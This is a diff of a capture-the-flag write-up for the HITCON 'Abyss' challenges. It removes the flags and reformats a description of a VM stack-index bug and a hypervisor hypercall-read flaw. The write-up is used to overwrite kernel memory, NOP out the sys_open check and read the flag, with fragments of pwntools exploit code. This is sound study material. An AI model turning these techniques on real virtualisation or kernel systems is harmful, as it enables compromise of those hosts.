@@ -1,9 +1,8 @@
 # Abyss I II III
 ## Abyss I
-> hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
 * NX disable.
 * `swap` function doesn't check the index, and the `machine` == `stack[-1]`.
-```c
+```clike
 void swap_()
 {
   unsigned int tmp;
@@ -49,13 +48,15 @@ y.sendlineafter( 'down.' , s )
 y.interactive()
 ```
 ## Abyss II
-> hitcon{take_out_all_memory,_take_away_your_soul}
-* `rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);`
-* Where `vm->mem` is our vm phisical address.
-* Kernel entry is 0, if we can let `but` == 0, so that  we are able to overwrite the kernel memory.
-* Hypervisor will get the return value of kmalloc().
-* `Hypercall read handler`:
+* Part of code of `hypercall read handler` in Hypervisor:
 ```c
+rw((unsigned int)fd_map[fd].real_fd, *(_QWORD *)&vm->mem + buf, len);
+```
+Where `vm->mem` is our vm phisical address.
+Kernel entry is 0, if we can let `but` == 0, so that  we are able to overwrite the kernel memory.
+Hypervisor will get the return value of kmalloc().
+* `Hypercall read handler`:
+```clike
 vaddr = *(_DWORD *)(vm->run + *(_QWORD *)(vm->run + 40LL));
 if ( (unsigned __int64)vaddr >= vm->mem_size )
      __assert_fail("0 <= (offset) && (offset) < vm->mem_size", "hypercall.c", 0x7Eu, "handle_rw");
@@ -254,10 +255,10 @@ signed __int64 malloc_top(unsigned __int64 nb)
 }
 ```
 * Just give a size which lager than `arena.top_size`, it will return 0.
-* `mmap(0, 0x1000000, 7)` -> `arena.top_size` remain the size < 0x1000000.
-* `sys_read( 0, buf, 0x1000000 )` -> `kmalloc` in `hypercall read` will return 0.
-* Pass 0 to hypervisor, `hypercall read handler` will do `read( 0, &vm->mem + 0 , 0x1000000 )`.
-* Now we can overwrite the whole kernel space! 
+    1. `mmap(0, 0x1000000, 7)` -> `arena.top_size` remain the size < 0x1000000.
+    2. `sys_read( 0, buf, 0x1000000 )` -> `kmalloc` in `hypercall read` will return 0.
+    3. Pass 0 to hypervisor, `hypercall read handler` will do `read( 0, &vm->mem + 0 , 0x1000000 )`.
+    4. Now we can overwrite the whole kernel space! 
 * For flag2, I overwrite the opcodes in  kernel `sys_open` which do checking filename with `nop`.
 * ORW flag2.
 * exploit:
@@ -303,10 +304,11 @@ y.recvline()
 user_stack = u64( y.recv(8) )
 success( 'User stack -> %s' % hex( user_stack ) )
 
-k_mod = kernel[:0x14d] + p64( 0x8002000000 ) + p64( user_stack + 0x100 ) + kernel[0x15d:0x9a4] + '\x90' * 0x75
+kernel_mod = kernel[:0x14d] + p64( 0x8002000000 ) + p64( user_stack + 0x100 )
+kernel_mod += kernel[0x15d:0x9a4] + '\x90' * 0x75
 
 sleep(1)
-y.send( k_mod )
+y.send( kernel_mod )
 
 y.interactive()
 ```
